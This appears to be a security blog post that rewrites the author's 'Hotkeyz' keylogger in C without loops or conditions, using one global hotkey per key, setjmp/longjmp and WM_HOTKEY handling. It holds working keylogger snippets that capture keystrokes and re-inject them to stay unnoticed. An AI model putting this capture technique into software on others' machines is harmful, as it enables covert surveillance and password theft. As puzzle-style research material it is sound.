# Programming without conditions or loops
This blogpost started as a challenge from the highly prolific Twitter/X account [vx-underground](https://x.com/vxunderground):
![A challenge appears](tweet_vx.png)

Since I already have my [Hotkeyz](https://github.com/yo-yo-yo-jbo/hotkeyz/) project, I thought it could be a nice answer to the challenge.  
One inspiration I had was the famous [Movfuscator](https://github.com/xoreaxeaxeax/movfuscator) but that seems like a huge overkill (I like Assembly but I guess the challenge was for higher level languages).  
So, given that, how do you code without loops or conditions?  

## Loops
In my original project, I have several loops:
1. The loop that registers the entire keyboard as hotkeys.
2. The loop that keeps peeking at Window Messages.

Well, loop #1 is easy, since I can just implement it in the most procedural way:
```c
	// Register all hotkeys (no loops)
	(VOID)RegisterHotKey(NULL, VK_BACK, 0, VK_BACK);
	(VOID)RegisterHotKey(NULL, VK_TAB, 0, VK_TAB);
	(VOID)RegisterHotKey(NULL, VK_RETURN, 0, VK_RETURN);
	(VOID)RegisterHotKey(NULL, VK_SPACE, 0, VK_SPACE);
	(VOID)RegisterHotKey(NULL, VK_INSERT, 0, VK_INSERT);
	(VOID)RegisterHotKey(NULL, VK_DELETE, 0, VK_DELETE);
	(VOID)RegisterHotKey(NULL, '0', 0, '0');
	(VOID)RegisterHotKey(NULL, '1', 0, '1');
	(VOID)RegisterHotKey(NULL, '2', 0, '2');
	(VOID)RegisterHotKey(NULL, '3', 0, '3');
	(VOID)RegisterHotKey(NULL, '4', 0, '4');
	(VOID)RegisterHotKey(NULL, '5', 0, '5');
	(VOID)RegisterHotKey(NULL, '6', 0, '6');
...
```

Note that I map each virtual key to its own ID, which should make things easier later as I do not need to maintain a complex table that maps between those.

Loop #2 is more challenging. In my original code I run the keylogger for a certain amount of time, but I think it's okay for me to just run forever.  
So, what I'm after is implementing this:
```c
for (;;)
{
    // Logic goes here
}
```

Initially I thought of using the [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) and [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) APIs, but it won't work since you cannot do it for a running thread.  
I could, of course, create a new thread and constantly call `SetThreadContext` when I feel like it, but it seems like an overkill. Instead, I used a different approach that comes straight from the C standard library: `setjmp` and `longjmp`!  
If you're unfamiliar with the concept, `setjmp` basically saves an "execution context" in a buffer, and `longjmp` restores that execution context (with the option of returning an arbitrary value from `setjmp` when jumping to it from `longjmp`). Curiously, there's even a Wikipedia page on [Wikipedia](https://en.wikipedia.org/wiki/Setjmp.h) - you're welcome to read it.  
Eseentially, I can now do the following:

```c
jmp_buf tJumpBuffer = { 0 };
...

(VOID)setjmp(tJumpBuffer);

// Loop logic goes here

longjmp(tJumpBuffer, 1);
```

## Conditions
For conditions I needed to check only a couple of things:
1. The return result of the [PeekMessageW](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagew) API - it's a `BOOL` but essentially will be either `0` or `1`.
2. Validating that the message type is `WM_HOTKEY`.

Both of those are comparisons to known values, with an `and` logic between them. Essentially what I want to do is:

```c
if ((PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE)) && (WM_HOTKEY == tMsg.message))
{
	cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);
	(VOID)wprintf(L"%c", cCurrVk);
	(VOID)UnregisterHotKey(NULL, cCurrVk);
	keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL);
	(VOID)RegisterHotKey(NULL, cCurrVk, 0, cCurrVk);
}
else
{
	Sleep(20);
}
```

